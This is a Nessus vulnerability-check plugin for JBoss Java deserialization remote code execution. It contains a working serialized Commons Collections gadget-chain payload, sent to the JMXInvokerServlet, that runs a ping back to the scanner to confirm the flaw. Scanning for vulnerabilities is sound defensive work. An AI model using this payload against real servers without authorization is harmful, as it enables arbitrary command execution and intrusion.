#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(87312);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/11/23 20:31:32 $");

  script_cve_id("CVE-2012-0874", "CVE-2015-7501");
  script_bugtraq_id(57552, 78215);
  script_osvdb_id(89583, 129952, 130424, 130493);
  script_xref(name:"CERT", value:"576313");
  script_xref(name:"EDB-ID", value:"30211");

  script_name(english:"JBoss Java Object Deserialization RCE");
  script_summary(english:"Attempts to execute a command on the remote host via a crafted RMI request.");

  script_set_attribute(attribute:"synopsis", value:
"The remote JBoss server is affected by multiple remote code execution
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote JBoss server is affected by multiple remote code execution
vulnerabilities :

  - A flaw exists due to the JMXInvokerHAServlet and
    EJBInvokerHAServlet invoker servlets not properly
    restricting access to profiles. A remote attacker can
    exploit this issue to bypass authentication and invoke
    MBean methods, allowing arbitrary code to be executed
    in the context of the user running the server.
    (CVE-2012-0874)

  - The remote host is affected by a remote code execution
    vulnerability due to unsafe deserialize calls of
    unauthenticated Java objects to the Apache Commons
    Collections (ACC) library. An unauthenticated, remote
    attacker can exploit this, by sending a crafted RMI
    request, to execute arbitrary code on the target host.
    (CVE-2015-7501)");
  # http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e0204f30");
  script_set_attribute(attribute:"see_also", value:"https://access.redhat.com/solutions/2045023");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate interim fix according to the vendor advisory.
Alternatively, ensure that all exposed ports used by the JBoss server
are firewalled from any public networks.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/12/10");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_a-mq");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_bpm_suite");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_data_virtualization");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_enterprise_application_platform");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_enterprise_brms_platform");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_enterprise_portal_platform");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_enterprise_soa_platform");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_enterprise_web_server");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_fuse");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_fuse_service_works");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:redhat:jboss_operations_network");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:redhat:jboss_data_grid");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("string.inc");
include("http.inc");

port = get_http_port(default:8080, embedded:FALSE);

# Check http banner for JBoss
banner = get_http_banner(port: port);
if ("JBoss" >!< banner && "Apache-Coyote" >!< banner) audit(AUDIT_NOT_LISTEN,"JBoss",port);

# Open connection to JBoss.
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL,"JBoss",port);

#
# setup unique id for pingback
#
id_tag = hexstr(rand_str(length:10));

#
# build request
#
rn = raw_string(0x0d, 0x0a);
raddress = get_host_ip();
laddress = this_host();

cmd = "ping -c 10 -p " + string(id_tag) + " " + laddress;
cmdlen = strlen(cmd);

serObj = hex2raw(s:"ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400");
serObj += raw_string(cmdlen) + cmd;
serObj += hex2raw(s:"740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A");

contentLen = strlen(serObj);

postdata = "POST /invoker/JMXInvokerServlet HTTP/1.1" + rn +
"Host: "+ raddress +":"+ string(port) + rn +
"Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue" + rn +
"Content-Length: " + string(contentLen) + rn + rn +
serObj;

# See if we get a response from RMI payload
filter = "icmp and icmp[0] = 8 and src host " + raddress;
s = send_capture(socket:soc, data:postdata, pcap_filter:filter);
s = tolower(hexstr(get_icmp_element(icmp:s,element:"data")));
close(soc);

# No response, meaning we didn't get in
if(isnull(s) || id_tag >!< s) audit(AUDIT_LISTEN_NOT_VULN,"JBoss",port);

report = NULL;

if (report_verbosity > 0)
{
  report =
    '\n' + 'Nessus was able to exploit a Java deserialization vulnerability using' +
    '\n' + 'a crafted RMI request.' +
    '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port:port);
